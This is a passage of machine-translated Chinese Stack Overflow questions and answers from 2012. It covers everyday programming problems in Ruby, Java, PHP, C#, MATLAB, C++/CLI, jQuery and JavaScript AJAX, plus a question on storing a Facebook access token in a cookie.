    :wm17=>":b1",:wm18=>":b2",:wm19=>":b3",:wm20=>":a2",:wm21=>":b2",:wm22=>":b2",:wm23=>":c2",:wm24=>":b2"
  } 
```

在这种情况下，我需要迭代 @anskey where @moves.keys == @anskey.keys

（看起来很简单，但似乎不起作用）

然后设置....

```
my_answer_is = @anskey.value 
```

所以是这样的？？？

```
@anskey.each do |key. value|
  if @moves.keys == key
     my_answer_is = @value
  end
end 
```

## 下面的违规代码

```
class Player

  attr_reader :boardpiece

  def initialize(letter)
    @boardpiece = letter
  end

  def move_human(game)
    puts "human move..."
    @move = gets.chomp
  end

  def move_computer(game)
    puts "computer move..."

    # all possible third moves as 'O' (computer)
    @ai_winmoves = {
        :wm01 => {:a1=>"O", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>"O", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm02 => {:a1=>" ", :a2=>"O", :a3=>" ", :b1=>" ", :b2=>"O", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm03 => {:a1=>" ", :a2=>" ", :a3=>"O", :b1=>" ", :b2=>"O", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm04 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>"O", :b2=>"O", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm05 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>"O", :b3=>"O", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm06 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>"O", :b3=>" ", :c1=>"O", :c2=>" ", :c3=>" "},
        :wm07 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>"O", :b3=>" ", :c1=>" ", :c2=>"O", :c3=>" "},
        :wm08 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>"O", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>"O"},
        #check those corners
        :wm09 => {:a1=>"O", :a2=>"O", :a3=>" ", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm10 => {:a1=>"O", :a2=>" ", :a3=>" ", :b1=>"O", :b2=>" ", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm11 => {:a1=>" ", :a2=>"O", :a3=>"O", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm12 => {:a1=>" ", :a2=>" ", :a3=>"O", :b1=>" ", :b2=>" ", :b3=>"O", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm13 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>" ", :b3=>"O", :c1=>" ", :c2=>" ", :c3=>"O"},
        :wm14 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>" ", :c2=>"O", :c3=>"O"},
        :wm15 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>"O", :c2=>"O", :c3=>" "},
        :wm16 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>"O", :b2=>" ", :b3=>" ", :c1=>"O", :c2=>" ", :c3=>" "},
        #check opposites
        :wm17 => {:a1=>"O", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>"O", :c2=>" ", :c3=>" "},
        :wm18 => {:a1=>" ", :a2=>"O", :a3=>" ", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>" ", :c2=>"O", :c3=>" "},
        :wm19 => {:a1=>" ", :a2=>" ", :a3=>"O", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>"O"},
        :wm20 => {:a1=>"O", :a2=>" ", :a3=>"O", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm21 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>"O", :b2=>" ", :b3=>"O", :c1=>" ", :c2=>" ", :c3=>" "},
        :wm22 => {:a1=>"O", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>"O"},
        :wm23 => {:a1=>" ", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>"O", :c2=>" ", :c3=>"O"},
        :wm24 => {:a1=>" ", :a2=>" ", :a3=>"O", :b1=>" ", :b2=>" ", :b3=>" ", :c1=>"O", :c2=>" ", :c3=>" "}
      }
    # match current answers located in @thegrid with possible @anskey array, iterate for each item
    @anskey={
        :wm01=>":c3",:wm02=>":c2",:wm03=>":c1",:wm04=>":b3",:wm05=>":b1",:wm06=>":a3",:wm07=>":a2",:wm08=>":a1",
        :wm09=>":a3",:wm10=>":c1",:wm11=>":a1",:wm12=>":c3",:wm13=>":c3",:wm14=>":c1",:wm15=>":c3",:wm16=>":a1",
        :wm17=>":b1",:wm18=>":b2",:wm19=>":b3",:wm20=>":a2",:wm21=>":b2",:wm22=>":b2",:wm23=>":c2",:wm24=>":b2"
      }
    #
    # scan board for available move locations

    # select all values where value is X for thegrid and copy those into keys_with_x

    # compare result to ai_winmoves
    keys_with_o = $thegrid.select{ |k, v| v == "O" }.keys
    matching_moves = @ai_winmoves.select{ |k, v| v.select{ |k, v| v == "O" }.keys == keys_with_o }
    # if matching_moves.keys contains anything with wm print results
    test_str = matching_moves.keys.to_s
    win_key  = matching_moves.keys
    # str = [:wm21]
    puts "keys with o:"
    puts keys_with_o
    puts "matching:"
    puts win_key

THIS IS THE AREA THAT BOTHERS ME

    if test_str =~ /wm/ #match found then...
      puts "WIN DETECTED" #TODO - which player won?
      puts win_key
      puts test_str
      # which answer is it?
      @anskey.each do |key, value|
        if matching_moves.keys == key
          puts "answer:"
          @move = @anskey[value]
          puts @move
          exit
        else
          puts "error in if else loop"
        end
      end
    else

END AREA THAT BOTHERS ME

      # scan board for available moves... 
      available_moves = $thegrid.select{ |k, v| v == " " }.keys
      # then make a random move
      puts "availble:"
      puts available_moves
      @move = available_moves[rand(available_moves.length)]
      # @move = "b2"
    end
  end
end 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T23:26:44.650

字符串不是符号。

您的其中一个哈希具有类似 的字符串`":c3"`，不等于`:c3`^*。

您可以使用 将字符串转换为符号`.to_sym`，或使用 将符号转换为字符串`.to_s`。

正如 Max 所说，没有（好的？）理由来存储字符串而不是符号。如果您可以更改代码，请将符号用作值和键，并完全跳过转换。这是首选，IMO。

^(* 除非您在 Rails 中或使用与`HashWithIndifferentAccess`.)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:55:39.133

当你说`@moves.keys`你得到一个包含所有键的数组时`@moves`。

在该行`if @moves.keys == key`中，您尝试将单元素数组`[:wm01]`与 symbol进行比较`:wm01`，但它们永远不会相等，因为它们是不同的类型。

如果您知道`@moves`此时代码中只有一个键，您可以通过`@moves.keys.first`. 然后使用该键索引`@anskey`而不是循环遍历它：

```
@anskey[@moves.keys.first] 
```

您不应该循环检查所有键是否相等的哈希。哈希的意义在于`hash[key]`语法为您提供了值，`key`而无需任何循环。

# java - 对象是类的一个实例（java）

> ID：12014301
> 
> 赞同：9
> 
> 时间：2012-08-17T23:19:08.487
> 
> 标签：java, object, instance

```
System.out.print("Enter Room Number: ");
int a4 = scan.nextInt();
scan.nextLine();
booking[count]= new RoomBooking (a1,a2,a3,a4);
count++;

if (/* if the object is an instance of RoomBooking(subclass) */) {
    for (int y = 0; y < count; y++) {
        if (a4 == (((RoomBooking) booking[y]).getRoomNumber())) {
            System.out.print("Used number, Please Try again");
        }
    }
} 
```

* * *

“如果对象是 RoomBooking（子类）的一个实例”我该如何用 java 编写呢？

对不起，如果这没有意义，还在学习中。

如果你想知道发生了什么，有 2 节课。Booking（普通Booking）和RoomBooking（扩展Booking）..由于我们必须创建一个存储两者混合的数组，我需要检查对象（a4）是否是RoomBooking的实例，以便我可以比较数字.

* * *

我试过 if ((RoomBooking.class.isInstance(a4))){...} 但它没有用。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-08-17T23:23:31.030

`if (object instanceof RoomBooking) ...`

和一个[有趣的阅读](http://www.javapractices.com/topic/TopicAction.do?Id=31)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-08-17T23:29:14.507

中也有`isAssignableFrom`方法`Class`。

```
if(CabinBooking.class.isAssignableFrom(object.getClass()) 
```

我更喜欢建议的方法，因为如果参数为空`@assylias`，它甚至会在`object == null`while中起作用。`isAssignableFrom`所以你必须检查实例不为空。

```
if(object instanceof CabinBooking.class) 
```

# php - 我可以从命名空间代码中声明一个全局函数吗？

> ID：12014305
> 
> 赞同：-1
> 
> 时间：2012-08-17T23:19:48.827
> 
> 标签：php, function, namespaces, global

我想避免创建另一个文件只是为了逃避命名空间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T23:41:59.507

找到了解决方案。对于其他感兴趣的人，请参见下文。

```
namespace { function myFunction() { ... } } 
```

# ruby-on-rails - Heroku 数据库导入将时间列转换为文本列。可以做些什么吗？

> ID：12014306
> 
> 赞同：1
> 
> 时间：2012-08-17T23:19:50.733
> 
> 标签：ruby-on-rails, postgresql, heroku, sqlite, taps

当我在做

```
heroku db:push 
```

导入我的 Rails 应用程序的开发数据库，​​“时间”列变为“文本”列。也就是说，它们是我的 SQLite 开发数据库中的“时间”，在我“推送”之前它们是 Heroku 上的“时间”，但之后它们变成了“文本”。

有没有办法将我的 SQLite 列推送为“时间”？为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T08:55:10.287

Heroku 发布了一个应用程序，让您可以在 Mac 上轻松使用 Postgresql，我建议在开发中使用它。

[http://postgresapp.com/](http://postgresapp.com/)

如果您部署到与本地使用不同的数据库，您一定会遇到问题。

# eclipse - 如何为 C++ 宏定义 Eclipse“代码样式”？

> ID：12014310
> 
> 赞同：4
> 
> 时间：2012-08-17T23:21:09.230
> 
> 标签：eclipse, coding-style

当我自动格式化包含宏的 C++ 代码时，Eclipse 在“;”之前添加了换行符和缩进。例如：

```
// Tests
TEST(Test1, Test1)
{
    EXPECT_EQ (2.0*2.0, 4.0)
        ;
} 
```

如何定义/编辑代码样式，以便将其显示为：

```
// Tests
TEST(Test1, Test1)
{
    EXPECT_EQ (2.0*2.0, 4.0);
} 
```

# c# - 如何将图像从 PhotoChooserTask 复制到位图

> ID：12014318
> 
> 赞同：2
> 
> 时间：2012-08-17T23:22:19.580
> 
> 标签：c#, windows-phone-7, bitmap, writeablebitmap

我一直在尝试制作用户从 PhotoChooserTask 中选择的图片的副本，并将其用作我的应用程序中的 hubtile 的背景图像，但我无法找到更合适的方法来完成此操作。到目前为止，我可以将 hubtile 图像设置为 PhotoChooserTask_Completed 响应，但我不知道如何对位图执行复制操作，以便在再次启动或重新激活应用程序时保存此图像。到目前为止，我所拥有的如下：

我创建了一个自定义 TileItem 类来管理 HubTiles 的数据

TileItem.cs

```
public class TileItem
{
    //Old Implementation        
    //public string ImageUri  { get; set; }

    //New Implementation
    public BitmapImage ImageUri { get; set; }
    public string Title  { get; set; }
    public string Notification  { get; set; }
    public bool DisplayNotification
    {
        get { return !string.IsNullOrEmpty(this.Notification); }
    }

    public string Message  { get; set; }
    public string GroupTag   { get; set; }

    //for translation purposes (bound to HubTile Title on MainPage) 
    public string TileName  { get; set; } 
```

MainPage.xaml.cs

```
PhotoChooserTask photoChooserTask;
TileItem tileItem;

public MainPage()
    {
        InitializeComponent();

        CreateHubTiles();

        photoChooserTask = new PhotoChooserTask();
        photoChooserTask.Completed += new EventHandler<PhotoResult>(photoChooserTask_Completed);
    } 
```

接下来我创建瓷砖并使用自定义设置类来保存我的数据（即现在是位图的“ImageUri”）

```
public void CreateHubTiles()
    {            
        List<TileItem> tileItems = new List<TileItem>() 
        {
            new TileItem() { ImageUri = Settings.shareImage.Value, Title = "status", /*Notification = "last shared link uri",*/ Message = Settings.statusMessage.Value, GroupTag = "TileGroup", TileName = AppResource.Main_MainPage_HubTile_Status_Title },

            new TileItem() { ImageUri = Settings.linkImage.Value, Title = "link", /*Notification = "last shared status message",*/ Message = Settings.linkUri.Value, GroupTag = "TileGroup", TileName = AppResource.Main_MainPage_HubTile_Link_Title },
        };

        this.tileList.ItemsSource = tileItems;
    } 
```

然后我负责 PhotoChooserTask 处理程序

```
public void changePictureMenuItem_Tap(object sender, System.Windows.Input.GestureEventArgs e)
    {
        var menuItem = (MenuItem)sender;
        tileItem = menuItem.DataContext as TileItem;  //used in PhotoChooserTask_Completed                

        try
        {
            photoChooserTask.Show();
        }
        catch (System.InvalidOperationException ex)
        {
            //MessageBox.Show("An error occurred");
            MessageBox.Show(AppResource.Main_MainPage_ContextMenu_ChangePicture_Error_Message);
        }
    }

    void photoChooserTask_Completed(object sender, PhotoResult e)
    {

        if (e.TaskResult == TaskResult.OK)
        {
            //BitmapImage bitmap = new BitmapImage();
            //bitmap.SetSource(e.ChosenPhoto);

            //get the correct tileItem that was clicked and set image source to respective hubtile
            string tileTitle = tileItem.Title.ToString();

            switch (tileTitle)
            {
                case "status":

                    tileItem.ImageUri.SetSource(e.ChosenPhoto);  //changes the hubtile image to selected image
                    //Settings.shareImage.Value.Equals(e.ChosenPhoto);

                    //Set the selected image to the shareImage bitmap in the Settings class to persist image
                    Settings.shareImage.Value.Equals(tileItem.ImageUri); //not working!                      
                    break;
                case "link":
                    //Same as above
                    tileItem.ImageUri.SetSource(e.ChosenPhoto);
                    //Settings.linkImage.Value.Equals(e.ChosenPhoto);
                    Settings.linkImage.Value.Equals(tileItem.ImageUri);
                    break;
            }

        }
        else if (e.TaskResult == TaskResult.Cancel)
            //MessageBox.Show("No picture was chosen - operation was cancelled", "Picture not chosen", MessageBoxButton.OK);
            MessageBox.Show(AppResource.Main_MainPage_ContextMenu_ChangePicture_TaskResultCancel_Message, AppResource.Main_MainPage_ContextMenu_ChangePicture_TaskResultCancel_Caption, MessageBoxButton.OK);
        else
            //MessageBox.Show("Error while choosing photo:\n" + e.Error.Message, "Fail", MessageBoxButton.OK);
            //MessageBox.Show("Error while choosing picture", "Fail", MessageBoxButton.OK);
            MessageBox.Show(AppResource.Main_MainPage_ContextMenu_ChangePicture_TaskResultError_Message, AppResource.Main_MainPage_ContextMenu_ChangePicture_TaskResultError_Caption, MessageBoxButton.OK);
    } 
```

最初`Settings.shareImage.Value`和`Settings.linkImage.value`已设置，但不会在 PhotoChooserTask_Completed 事件中相应更改或更新。

设置.cs

```
public static readonly Setting<BitmapImage> shareImage = new Setting<BitmapImage>("shareImage", new BitmapImage(new Uri("/Images/shareStatusImage.jpg", UriKind.Relative)));

public static readonly Setting<BitmapImage> linkImage = new Setting<BitmapImage>("linkImage", new BitmapImage(new Uri("/Images/shareLinkImage.jpg", UriKind.Relative))); 
```

因此，图像仅在应用程序未关闭时更新（在 PhotoChooserTask_Completed 事件中），然后在重新启动或激活时将它们设置回原始图像。如何相应地复制这些图像，以便从 PhotoChooserTask 中选择的图像可以永久用作`ImageUri`每个 TileItem 的新图像（根据我的第一个类，现在实际上是位图）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T10:08:33.443

如果我对您的理解正确，您需要找到一种方法将拍摄的图像保存到隔离存储并在下次启动应用程序时加载。看看[http://www.windowsphonegeek.com/tips/All-about-WP7-Isolated-Storage---Read-and-Save-Images](http://www.windowsphonegeek.com/tips/All-about-WP7-Isolated-Storage---Read-and-Save-Images)，它包含保存和加载位图图像的完整代码

# jquery - 如何解决此悬停问题

> ID：12014321
> 
> 赞同：0
> 
> 时间：2012-08-17T23:22:48.120
> 
> 标签：jquery

我正在尝试在按钮上应用悬停和悬停效果，并且在悬停按钮上方会弹出一个 div。如果用户将鼠标悬停在按钮之外，弹出 div 将消失。

我的问题是，当弹出 div 弹出并且按钮的悬停事件将启动时，因为弹出 div 此刻悬停。

```
$('.helpImg').hover(function(){
    $(this).css({'cursor': 'pointer'});
    tooltip = $(this).next().attr('id');
    $('#tool').show(150);
}, function (){
    $(this).css({'cursor': 'auto'});
    $('#tool').hide(50);
}) 
```

#tool div 将在我单击按钮后立即隐藏，因为 div 位于按钮上方并且被认为是“悬停”

无论如何要解决这个问题？？谢谢 。

**更新代码**

```
 $('.helpImg').hover(function(){
            $(this).css({'cursor': 'pointer'});
            toolid=$(this).next().attr('id');
            $('#tooltip-' + toolid).show(150);
        },function (){
            $('#toolip-' + toolid).hide(150);
        }) 
```

我无法对弹出窗口进行硬编码，因为除非将元素`div`悬停，否则我不知道 ID 。`helpImg`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:45:10.610

这是解决悬停在不同元素等问题的方法：

```
var timer;

$('.helpImg').on({
    mouseenter: function() {
        clearTimeout(timer);
        $(this).css({'cursor': 'pointer'});
        $('#tool').show(150);
    },
    mouseleave: function() {
        timer = setTimeout(function() {
            $(this).css({'cursor': 'auto'});
            $('#tool').hide(50);
        }, 300);
    }
});

$("#tool").on({
    mouseenter: function() {
        clearTimeout(timer);
    },
    mouseleave: function() {
        $(this).hide(50);
    }
}); 
```

[**小提琴**](http://jsfiddle.net/dtrS8/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:07:50.700

尝试：

```
$('.helpImg').css({'cursor': 'pointer'}).hover(function(){
    $('#tool').show(150);
}, function (){
    $('#tool').not(':visible').hide(50);
});

$('#tool').mouseout(function(){ this.style.display = 'none'; }) 
```

# c# - 从 XML 转换数组

> ID：12014325
> 
> 赞同：2
> 
> 时间：2012-08-17T23:22:57.303
> 
> 标签：c#, xml, xpath, xml-serialization

我对在我的文件中使用 XML 有点陌生，并且想要序列化然后反序列化一个对象。该对象包含一对字符串、一个 int 和两个 int[] 数组。使用 XmlSerializer 进行序列化，生成的 XML 看起来像这样：

[http://codepaste.net/x9x5ms](http://codepaste.net/x9x5ms)

```
<?xml version="1.0" encoding="utf-16"?>
<Harvey xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Name>Carl</Name>
  <Ch>KNV</Ch>
  <Tn>40</Tn>
  <APoints>
    <int>8</int>
    <int>20</int>
    <int>16</int>
    <int>16</int>
    <int>12</int>
    <int>12</int>
    <int>16</int>
    <int>16</int>
    <int>4</int>
    <int>4</int>
    <int>4</int>
  </APoints>
  <SPoints>
    <int>3</int>
    <int>12</int>
    <int>10</int>
    <int>10</int>
    <int>6</int>
    <int>6</int>
    <int>10</int>
    <int>10</int>
  </SPoints>
</Harvey> 
```

问题是试图将 int[] 值加载回它们的数组中。我无法弄清楚如何告诉应用程序我想将所有 Apoint 加载到 int[] 数组中。我怀疑解决方案非常简单，但我一直无法弄清楚。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-18T00:00:16.940

一样容易

```
[XmlRoot( "Harvey" )]
public class Widget
{

    [XmlElement]
    public string Name { get ; set; }

    [XmlElement]
    public string Ch   { get ; set; }

    [XmlElement]
    public int    Tn   { get ; set; }

    [XmlArray("APoints")]
    [XmlArrayItem("int")]
    public int[] APoints { get ; set ; }

    [XmlArray("SPoints")]
    [XmlArrayItem("int")]
    public int[] SPoints { get ; set ; }

}

class Program
{
    public static T Rehydrate<T>( string xml )
    {
        T instance ;
        XmlSerializer serializer = new XmlSerializer( typeof(T) ) ;

        using ( TextReader tr = new StringReader( xml ) )
        {
            instance = (T) serializer.Deserialize( tr ) ;
        }
        return instance ;
    }

    static void Main( string[] args )
    {
        string xml = @"
<Harvey xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
  <Name>Carl</Name>
  <Ch>KNV</Ch>
  <Tn>40</Tn>
  <APoints>
    <int>8</int>
    <int>20</int>
    <int>16</int>
    <int>16</int>
    <int>12</int>
    <int>12</int>
    <int>16</int>
    <int>16</int>
    <int>4</int>
    <int>4</int>
    <int>4</int>
  </APoints>
  <SPoints>
    <int>3</int>
    <int>12</int>
    <int>10</int>
    <int>10</int>
    <int>6</int>
    <int>6</int>
    <int>10</int>
    <int>10</int>
  </SPoints>
</Harvey>
";
        Widget instance = Rehydrate<Widget>( xml ) ;

        return;
    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T16:14:46.200

**比序列化更简单的东西**：

```
XmlReader reader = XmlReader.Create(new StringReader(xml));
XElement root = XElement.Load(reader);

int[] myInts = ((IEnumerable)root.XPathEvaluate("APoints/int"))
                 .OfType<XElement>()
                 .Select(el => int.Parse(el.Value))
                 .ToArray(); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-17T23:55:44.803

这是我前段时间写的课程：

```
public static class Serializer
{
    // returns false in case of an error
    public static bool save(string fileName, Object obj)
    {
        XmlSerializer serializer = null;
        TextWriter textWriter = null;
        bool res = false;

        try
        {
            serializer = new XmlSerializer(obj.GetType());
            textWriter = new StreamWriter(fileName);
            serializer.Serialize(textWriter,obj);
            res = true;
        }
        catch(Exception ex)
        {
            // handle error
        }
        finally
        {
            if (null != textWriter)
                textWriter.Close();
        }

        return res;
    }

    // returns null in case of an error
    public static Object load(Type type, string fileName)
    {
        XmlSerializer deserializer=null;
        TextReader textReader=null;
        Object res = null;
        try
        {
            deserializer = new XmlSerializer(type);
            textReader = new StreamReader(fileName);
            res=deserializer.Deserialize(textReader);

        }
        catch(Exception ex)
        {
            // handle error
        }
        finally
        {
            if (null != textReader)
                textReader.Close();
        }

        return res;
    }
} 
```

这就是你使用它的方式：

```
public class Data
{
    public int a;
    public int[] arr;
}

private void button1_Click(object sender, EventArgs e)
{
    Data myData = new Data();
    myData.a = 2;
    myData.arr=new int[]{1,2,3,7};
    Serializer.save("file.xml", myData);
}

private void button2_Click(object sender, EventArgs e)
{
    Data myData;
    myData = (Data)Serializer.load(typeof(Data), "file.xml");

} 
```

# matlab - datenum 转换失败，字符串格式为 'QQ-YYYY'

> ID：12014327
> 
> 赞同：2
> 
> 时间：2012-08-17T23:23:17.357
> 
> 标签：matlab, datetime, date-format

我有一个相当简单的问题：我有一个看起来像这样的细胞向量：

```
temp_y_date{1} = '2012Q2'
temp_y_date{2} = '2012Q1'
temp_y_date{3} = '2011Q4' 
```

我想使用函数[datenum](http://www.mathworks.nl/help/techdoc/ref/datenum.html)将此单元格向量转换为日期向量。我最初将向量转换为“QQ-YYYY”格式，如下所示：

```
for i = 1:length(temp_y_date)
   temp = temp_y_date(i);
   year = cellfun(@(c) {c(1:4)}, temp);
   quarter = cellfun(@(c) {c(5:6)}, temp);
   temp_y_date(i) = strcat(quarter,'-',year);
end 
```

temp_y_date 的值现在是

```
temp_y_date (1) = 'Q2-2012'
temp_y_date (2) = 'Q1-2012'
temp_y_date (3) = 'Q4-2011' 
```

我想我现在可以应用 datenum 函数：

```
temp_y_date = datenum(temp_y_date,'QQ-YYYY'); 
```

但是，我收到错误：

```
??? Error using ==> datenum at 178
DATENUM failed.

Caused by:
Error using ==> dtstr2dtnummx
Failed on converting date string to date number. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T07:00:40.780

我在 R2009b 和 R2012a 上都进行了测试。您的代码适用于后者，但我在 R2009b 中遇到相同的错误。

当我将 Q 放入其中时，`temp_y_date`它已在旧版本中修复。所以显然旧版本不接受四分之一的定义。

~~工作代码：~~

```
strdate = {'2012Q2', '2012Q1', '2011Q4'};
strdate2 = cellfun(@(c) strcat(c(6),'-',c(1:4)),strdate,'uni',false);

result = datenum(strdate2,'QQ-YYYY'); 
```

我改变了你的变量名，所以调试起来更容易。还修复了带有 cellfun 的循环，您使用它的效率很低。我建议你了解什么是单元格，以及如何索引它。

注意：如果您升级到另一个版本，或者其他人在更高版本中使用它，这*将中断。*所以如果你不想这样，我建议你使用[verLessThan](http://www.mathworks.nl/help/techdoc/ref/verlessthan.html)来区分不同版本的matlab：

## 编辑：

来自`help datenum`：

> DATENUM 不接受带有“Q”的格式。

所以我想你必须自己升级或实现这个，但看起来并不难：

```
strdate = {'2012Q2', '2012Q1', '2011Q4'};
if verLessThan('matlab','7.12') % or maybe 7.11, it depends on which version the datenum functionality changed...
    strdate2 = cellfun(@(c) sprintf('%s/%02d/01',c(1:4),3*str2double(c(6))-2),strdate,'uni',false);
    result = datenum(strdate2,'YYYY/mm/dd');
else
    strdate2 = cellfun(@(c) strcat(c(5:6),'-',c(1:4)),strdate,'uni',false);
    result = datenum(strdate2,'QQ-YYYY');
end 
```

如您所见，旧版本的 datenum 需要完整的日期规范：'YYYY/mm/dd'。

# c++ - 监视器中的 obj 应该是什么::enter

> ID：12014340
> 
> 赞同：0
> 
> 时间：2012-08-17T23:24:38.037
> 
> 标签：c++, .net, c++-cli

我仍然熟悉多线程的锁定。

```
Monitor::Enter(obj);

try
{   
    ///do work
}

finally
{
    Monitor::Exit(obj);
} 
```

应该在哪里`obj`声明什么？我在 Locator 类的构造函数中声明它，

```
Locator()
{ 
    System::Object^ obj = gcnew System::Object();
} 
```

`obj`并在类的私有变量中声明

```
private:
    System::Object^ obj; 
```

但它在`Monitor::Enter(obj)`说之后给了我一个错误

```
Value cannot be null. 
```

任何提示表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T23:31:45.423

你的构造函数应该是：

```
Locator()
: obj(gcnew System::Object())
{  } 
```

您正在做的是创建一个新的*局部*变量，该变量立即超出范围，将它正在跟踪的对象带入早期坟墓。你的意思是初始化*成员*变量。在您的情况下，成员变量一直保留`null`，导致您观察到的错误。

（由于我不太了解 CLI，可能是不允许您在构造函数 initalizer 列表中初始化跟踪的引用。在这种情况下，这样写：）

```
Locator() { obj = gcnew System::Object(); } 
```

# asp.net - 将 ASP.NET 会话数据存储在 cookie 中

> ID：12014341
> 
> 赞同：0
> 
> 时间：2012-08-17T23:24:46.547
> 
> 标签：asp.net, facebook, session, cookies

在学习如何将 Facebook 身份验证集成到 ASP.NET MVC 应用程序中时，我编写了一个代码，该代码使用会话状态来存储通过 Facebook JS SDK 获得的 access_token。一旦 java 脚本代码拥有访问令牌，它就会被发布到一个特殊的控制器操作上，该操作将其存储在 Session 字典中。

我想避免使用 Session 但仍然可以使用访问令牌来检索用户信息。将其存储在非永久性 cookie 中是否安全？效果会一样吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-19T01:27:40.763

*   您可能会感兴趣的是，官方 PHP SDK 将访问令牌存储在会话中，**或者**`signed_request`存储在 cookie 中。但是，它`signed_request`是使用*应用程序机密*加密的，这比存储未加密的访问令牌要安全得多。 [https://github.com/facebook/facebook-php-sdk/tree/master/src](https://github.com/facebook/facebook-php-sdk/tree/master/src)

*   另外，这里是关于 cookie 与会话安全性的 stackoverflow 的先前讨论： [我在登录系统中使用 cookie 或会话登录吗？](https://stackoverflow.com/questions/3188182/do-i-login-using-cookies-or-sessions-in-a-login-system)

*   如果您愿意，您可以创建自己的加密签名请求，但永远不要从您的客户那里这样做（因为它需要将秘密存储在您的客户上）。有关更多信息，请参阅 PHP SDK 和/或链接： [https ://developers.facebook.com/docs/authentication/signed_request/](https://developers.facebook.com/docs/authentication/signed_request/)

# javascript - Javascript 和 AJAX 槽外函数

> ID：12014343
> 
> 赞同：0
> 
> 时间：2012-08-17T23:24:53.340
> 
> 标签：javascript, ajax, wait

```
function ajax_request(destination_full_url) {

    if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            alert("response: \n" + xmlhttp.responseText);
            return xmlhttp.responseText;

        }
    }

    xmlhttp.open("GET", destination_full_url, true);
    xmlhttp.send();
}

    function third_party_function(obj) {
       var response
       response = ajax_request("info.php?keyword=obj.value");
       alert(response);         
    }

<textarea onkeypress="third_party_function(this);"></textarea> 
```

在带有 ajax 请求的消息框关闭后一秒钟，首先关闭消息框“underfined”。

问题是它为什么运行警报（响应）；在完成上一步之前，我如何让它等到 ajax_request() 函数完成后再进入下一行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T23:36:21.810

因为 ajax 是异步的并且默认在后台运行，所以你可以通过从

xmlhttp.open("GET", destination_full_url, true);

到

xmlhttp.open("GET", destination_full_url, false);

=== 更新 ===

```
function ajax_request(destination_full_url, callback){
.....
xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            alert("response: \n" + xmlhttp.responseText);
           callback(xmlhttp.responseText);

        }
    }
...
}

....

function third_party_function(obj) {
       ajax_request("info.php?keyword=obj.value", function(response){alert(response) });

    } 
```

# c# - 对不同的组合框使用相同的功能

> ID：12014345
> 
> 赞同：0
> 
> 时间：2012-08-17T23:25:13.337
> 
> 标签：c#, combobox

我怎样才能更有效地做到这一点？理想情况下，我可以在没有任何参数的情况下调用 showTag 并返回正确的组合框。

我添加了参数表来定义 showTag 返回的值是来自comboBox1 还是comboBox2。因此，如果我想要 comboBox1 的值，我调用 showTag(1)，如果我想要 comboBox2 的值，我调用 showTag(2)

```
//Return the currently selected language
public string showTag(int table)
{
    string LanguageSelection = String.Empty;
    if (table == 1)
    {
        LanguageSelection = comboBox1.SelectedItem.ToString();
    }
    else
    {
        LanguageSelection = comboBox2.SelectedItem.ToString();
    }
    string[] LanguageTag = LanguageSelection.Split(' ');
    string tag = LanguageTag[1].Replace("<", "").Replace(">", "");
    return tag;
} 
```

